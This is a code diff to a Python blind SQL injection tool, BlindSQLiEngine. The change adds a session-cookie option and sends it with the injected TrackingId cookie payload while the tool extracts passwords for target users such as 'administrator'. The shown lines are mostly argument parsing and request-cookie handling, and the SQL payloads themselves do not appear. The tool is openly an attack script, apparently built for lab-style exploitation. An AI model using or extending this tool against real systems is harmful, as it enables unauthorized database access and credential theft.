@@ -40,7 +40,7 @@ def banner():
     [+] Creator   : M Haidar                            
     [+] LinkedIn  : https://www.linkedin.com/in/haidarobs            
     [+] GitHub    : https://github.com/mdhaidarobs                    
-    [+] Version   : 3.4 (Exact Logic Fix)
+    [+] Version   : 3.5 (Session Cookie Fixed)
     ====================================================================
 {Style.RESET_ALL}
     """)
@@ -59,6 +59,7 @@ def get_user_input_interactive():
     parser.add_argument("-u", "--url", default=None)
     parser.add_argument("-t", "--tracking", default="182--")
     parser.add_argument("-c", "--cookie", default="TrackingId")
+    parser.add_argument("-sc", "--session", default=None)
     parser.add_argument("-usr", "--users", default="administrator")
     parser.add_argument("-l", "--length", type=int, default=None)
     parser.add_argument("-p", "--proxy", default=None)
@@ -89,6 +90,10 @@ def get_user_input_interactive():
     if cookie_name:
         args.cookie = cookie_name
 
+    session_cookie = input(f"{Fore.CYAN}Enter Session Cookie value (if required): {Style.RESET_ALL}").strip()
+    if session_cookie:
+        args.session = session_cookie
+
     users_input = input(f"{Fore.CYAN}Enter Username(s) to target (comma separated) [Default: administrator]: {Style.RESET_ALL}").strip()
     if users_input:
         args.users = users_input
@@ -118,6 +123,7 @@ class BlindSQLiEngine:
         self.url = args.url
         self.base_id = args.tracking
         self.cookie_name = args.cookie
+        self.session_cookie = args.session
         self.target_users = [u.strip() for u in args.users.split(',')]
         self.max_length = args.length
         self.use_special = args.special
@@ -132,7 +138,6 @@ class BlindSQLiEngine:
                 'http': args.proxy,
                 'https': args.proxy
             }
-            log_info(f"Proxy enabled: {args.proxy}")
 
         self.charset = string.ascii_lowercase + string.ascii_uppercase + string.digits
         if self.use_special:
@@ -165,6 +170,9 @@ class BlindSQLiEngine:
 
     def _send_request(self, payload, mode):
         cookies = {self.cookie_name: payload}
+        if self.session_cookie:
+            cookies["session"] = self.session_cookie
+
         try:
             response = self.session.get(
                 self.url,
@@ -324,6 +332,7 @@ def main():
         parser.add_argument("-u", "--url", required=True, help="Target URL")
         parser.add_argument("-t", "--tracking", default="182--", help="Base Tracking ID")
         parser.add_argument("-c", "--cookie", default="TrackingId", help="Cookie name")
+        parser.add_argument("-sc", "--session", default=None, help="Session cookie value")
         parser.add_argument("-usr", "--users", default="administrator", help="Usernames")
         parser.add_argument("-l", "--length", type=int, default=None, help="Password length")
         parser.add_argument("-p", "--proxy", help="Proxy URL")
